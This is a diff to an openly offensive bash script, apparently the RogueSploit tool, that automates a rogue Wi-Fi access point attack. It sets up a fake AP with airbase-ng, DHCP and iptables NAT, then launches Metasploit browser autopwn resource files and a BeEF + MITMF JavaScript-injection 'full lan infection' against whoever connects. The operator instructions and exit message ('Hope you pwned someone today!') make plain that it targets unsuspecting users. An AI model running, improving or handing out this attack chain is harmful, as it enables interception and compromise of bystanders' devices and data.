@@ -36,7 +36,6 @@ msfd
 pkill dhcpd
 pkill airbase-ng
 airmon-ng stop wlan1mon
-ifconfig at0 down
 sleep 3
 echo -ne $red"Press any key to continue... "
 read starting
@@ -96,7 +95,7 @@ EOF
 }
 #starting the pwning
 
-autopwning1 () {
+relase_rules () {
 	pkill dhcpd
 	ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
 	iptables -F
@@ -106,34 +105,46 @@ autopwning1 () {
 	iptables -A FORWARD -i wlan1 -j ACCEPT
 	touch /var/lib/dhcp/dhcpd.leases
 	dhcpd -cf dhcpd.conf at0
+}
+#AutoPWN 1
+autopwning1 () {
+	rogueon
+	sleep 0.7
 	msfconsole -r $(pwd)/roguepwn1.rc
 }
 #AutoPWN 2
 autopwning2 () {
-	pkill dhcpd
-	ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
-	iptables -F
-	iptables -t nat -F
-	iptables -t mangle -F
-	iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
-	iptables -A FORWARD -i wlan1 -j ACCEPT
-	touch /var/lib/dhcp/dhcpd.leases
-	dhcpd -cf dhcpd.conf at0
+	rogueon
+	sleep 0.7
 	msfconsole -r $(pwd)/roguepwn2.rc
 }
 
+#Correct Mitmf installation
+mitmf_install () {
+	echo -ne $blue"["$yellow"?"$blue"] "$yellow"Do you want to correctly install MITMF? "$blue"["$yellow"*"$blue"]";
+	read mitans
+	if [ $mitans != 'n' ] && [ $mitans != 'N' ] && [ $mitans != 'No' ]
+		then
+		apt-get remove mitmf
+		apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
+		cd $HOME && git clone https://github.com/byt3bl33d3r/MITMf
+		cd $HOME/MITMf && git submodule init && git submodule update --recursive
+		cd $HOME/MITMf && pip install -r requirements.txt
+		cat << "EOF > /usr/bin/mitmf
+#!/bin/bash
+cd $HOME/MITMf/ && sudo python mitmf.py "$@"
+EOF
+		chmod 777 /bin/bash/mitmf
+		sudo pip uninstall Twisted
+		sudo pip install Twisted==15.5.0
+		sleep 2
+		echo -e $green"[*] DONE [*]"
+	elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'Yes' ]
+		then
+	fi
+}
 #BeEF w/ Mitmf's js url injection
 beefinject () {
-	pkill dhcpd
-	pkill tor*
-	ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
-	iptables -F
-	iptables -t nat -F
-	iptables -t mangle -F
-	iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
-	iptables -A FORWARD -i wlan1 -j ACCEPT
-	touch /var/lib/dhcp/dhcpd.leases
-	dhcpd -cf dhcpd.conf at0
 	echo -e $blue"["$yellow"*"$blue"]"$yellow" Starting BeEF Locally! "$blue"["$yellow"*"$blue"]"
 	sleep 0.6
 	echo -e $blue"["$yellow"*"$blue"]"$white" Changing configuration of BeEF! "$blue"["$yellow"*"$blue"]"
@@ -937,7 +948,7 @@ if test $answer1 == '1'
 	sleep 1
 	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
 	sleep 2
-	sudo airbase-ng -e "$nameap" -v wlan1
+	sudo xterm -title "FAKE AP" -bg "#000000" -fg "#ff0000" -geometry 100x25+1-1 -e airbase-ng -e "$nameap" -v wlan1 & relase_rules && rogueon 
 	menu
 elif test $answer1 == '2'
 	then
@@ -1026,7 +1037,7 @@ elif test $answer1 == '6'
 	echo -e $yellow" 1) OPEN 2 DIFFERENT TERMINALS;"
 	echo -e $yellow" 2) START THE SCRIPT AND SELECT ROGUE AP (Option 1) ON FIRST TERMINAL;"
 	echo -e $yellow" 3) IN THE SECOND TERMINAL SELECT PWNING SERVICES (Option 2)"
-	echo -e $yellow" 4) THEN JUST WAIT FOR SOMEONE CONNECTING TO YOURE AP AND THEY WILL BE REDIRECTED TO YOUR LOCAL BROWSER_AUTOWPN SERVER!"
+	echo -e $yellow" 4) THEN JUST WAIT FOR SOMEONE CONNECTING TO YOURE AP AND THEY WILL BE REDIRECTED TO YOUR LOCAL TRAP!"
 	echo -e $yellow" 5) Did you understand $myname ?If any problems, or strange things appens, just go here --> https://github.com/B4ckP0r7/RogueSploit/issues and open a new issue!"
 	echo -ne $yellow"Press any key to continue..."
 	read continuos
@@ -1048,20 +1059,21 @@ elif test $answer1 == '7'
 		cp roguepwn1.rc $HOME/RogueBackup/roguepwn1.rc.backup
 		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn1.rc" -s -o $PWD/roguepwn1.rc
 		sleep 0.4
-		cp roguepwn1.rc $HOME/RogueBackup/roguepwn2.rc.backup
-		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn2.rc" -s -o $PWD/roguepwn2
 		echo -e $blue"[*]"$yellow"Updating roguepwn2.rc file"$blue"[*]"
-		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/README.md" -s -o $PWD/README.md
+		cp roguepwn2.rc $HOME/RogueBackup/roguepwn2.rc.backup
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn2.rc" -s -o $PWD/roguepwn2
+		sleep 0.4
 		echo -e $blue"[*]"$yellow"Updating README file"$blue"[*]"
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/README.md" -s -o $PWD/README.md
 		chmod +x * -R
-		echo -e ""$green"Updated successfully! Restarting the script to apply the changes ..."
+		echo -e $green" Updated successfully! Restarting the script to apply the changes ..."
 		sleep 3
 		exec $0
 		exit
 	elif [ $cancel != 'y' ] && [ $cancel != 'Y' ]
 		then
-		echo -e $red"[!!] Update aborted! Returning main menu in 5 secs [!!]"
-		sleep 5
+		echo -e $red"[!!] Update aborted! Returning main menu in 3 secs [!!]"
+		sleep 3
 		menu
 	fi
 else
@@ -1074,7 +1086,6 @@ else
 		pkill dhcpd
 		pkill airmon-ng
 		pkill airbase-ng
-		ifconfig at0 down
 		sleep 1
 		echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
 		echo -e $yellow"--<[*] Thank You For Using RogueSploit B) [*]>--"
@@ -1089,6 +1100,8 @@ fi
 }
 #menu2
 welcome
+clear
+mitmf_install
 clear
 echo -e $yellow"--<"$blue"[*]"$yellow" Welcome $myname, this is Roguesploit -- by _B4ckp0r7 "$blue"[*]"$yellow">--"
 echo -e $lightgreen"--<[?] What do you want to do? [?]>-- ";
@@ -1114,15 +1127,15 @@ if test $answer1 == '1'
 	sleep 1
 	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
 	sleep 2
-	sudo airbase-ng -e "$nameap" -v wlan1
+	sudo airbase-ng -e "$nameap" -v wlan1 &&
 	menu
 elif test $answer1 == '2'
 	then
 	clear
 	echo -e $green"Which services do you want to start $myname? "
-	echo -e $yellow" 1. Browser Autopwn 1 "
-	echo -e $blue" 2. Browser Autopwn 2 "
-	echo -e $white"3. BeEF + MITMF full lan infection"
+	echo -e $yellow" 1) Browser Autopwn 1 "
+	echo -e $blue" 2) Browser Autopwn 2 "
+	echo -e $white" 3) BeEF + MITMF full lan infection"
 	echo -ne $red"$myname@pwningservices: ";tput sgr0
 	read choice
 	if test $choice == '1'
@@ -1189,7 +1202,6 @@ elif test $answer1 == '5'
 	pkill dhcpd
 	pkill airmon-ng
 	pkill airbase-ng
-	ifconfig at0 down
 	echo -e $red"Goodbye $myname.."
 	sleep 2
 	clear
@@ -1251,7 +1263,7 @@ else
 		ifconfig at0 down
 		sleep 1
 		echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
-		echo -e $yellow"--<[*] Thank You For Using Karmasploit B) [*]>--"
+		echo -e $yellow"--<[*] Thank You For Using RogueSploit B) [*]>--"
 		sleep 2
 		clear
 		exit
